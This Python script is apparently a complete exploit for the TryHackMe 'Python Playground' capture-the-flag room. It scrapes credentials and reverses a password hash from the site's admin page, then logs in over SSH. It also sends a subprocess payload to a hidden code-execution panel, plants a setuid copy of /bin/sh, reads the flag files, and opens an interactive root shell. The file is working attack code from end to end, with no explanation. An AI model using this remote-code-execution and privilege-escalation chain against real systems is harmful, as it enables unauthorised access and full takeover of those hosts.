import requests
import re
from requests.utils import requote_uri
from bs4 import BeautifulSoup
import argparse
import paramiko
ssh = paramiko.SSHClient()

def get_parser():
    parser = argparse.ArgumentParser(description="Exploits Python Playground from TryHackMe")
    parser.add_argument("-i","--ip",action="store",dest="ip",default=False, help="Room ip",required=True)
    parser.add_argument("-v","--verbose",action="store_true", dest="verbose",default=False, help="Print flags")
    return parser

def reverse_hash(hash,iterations):
    if(iterations > 0):
        reversed = ""
        i = 0
        while i < len(hash):
            reversed += chr(26 * (ord(hash[i]) - 97) + (ord(hash[i + 1]) - 97))
            i = i + 2
        return reverse_hash(reversed,iterations - 1)
    else:
        return hash

def get_creds(ip):
    admin_dir = "admin.html"
    url = f"http://{ip}/{admin_dir}"
    r = requests.get(url)
    lines = r.text.split("\n")
    creds = {}
    for line in lines:
        if(line.find("username") > 0 and line.find("getElementById") > 0):
            creds["username"] = line.split('\'')[3] 
        elif(line.find("hash ===") > 0):
            creds["password"] = reverse_hash(line.split('\'')[1],2)
    return creds

def exec_docker(ip,command):
    exec_dir = "super-secret-admin-testing-panel.html"
    url = f"http://{ip}/{exec_dir}"
    payload = f'''
subprocess = __import__("subprocess")
print(subprocess.call("{command}", shell=True))
    '''
    r = requests.post(url, data={"code": payload})
    soup = BeautifulSoup(r.content,'html.parser')
    matches = soup.find_all("textarea")
    return matches[1].get_text()

def exec_ssh(connection,command):
    ssh_stdin, ssh_stdout, ssh_stderr = connection.exec_command(command)
    stderr = ssh_stderr.readlines()
    stderr = "".join(("".join(stderr)).split("\n")[:-1])
    stdout = ssh_stdout.readlines()
    stdout = "".join(("".join(stdout)).split("\n")[:-1])
    return {"stderr": stderr, "stdout":stdout}

def get_first_flag(ip):
    output = exec_docker(ip,"cat ../flag1.txt")
    return output.split("\n")[0]

def get_second_flag(ip,connection):
    return exec_ssh(ssh,"cat flag2.txt")

def get_third_flag(connection):
    return exec_ssh(connection,"/var/log/sh -p -c 'cat /root/flag3.txt'")

def root(connection):
    channel = ssh.invoke_shell()
    while True:
        command = input("$ ")
        if command == "exit":
            break
        result = exec_ssh(ssh,f"/var/log/sh -p -c '{command}'")
        print(result["stdout"])
        print(result["stderr"])


def exploit():
    parser = get_parser()
    args = parser.parse_args()
    ssh_creds = get_creds(args.ip)
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=args.ip,username=ssh_creds["username"], password=ssh_creds["password"])
    exec_ssh(ssh,"ls")
    exec_docker(args.ip,"cp /bin/sh /mnt/log")
    exec_docker(args.ip,"chmod 777 /mnt/log/sh")
    exec_docker(args.ip,"chmod +s /mnt/log/sh")
    if(args.verbose):
        flags = []
        flags.append(get_first_flag(args.ip))
        flags.append(get_second_flag(args.ip,ssh)["stdout"])
        flags.append(get_third_flag(ssh)["stdout"])
        for flag in flags:
            print(f"[*] {flag}")
    root(ssh)
    #print(exec_ssh(ssh,"/var/log/sh -p -c 'ls /root'"))
    #print(exec_ssh(ssh,"/var/log/sh -p -c 'cat flag3.txt'"))



exploit()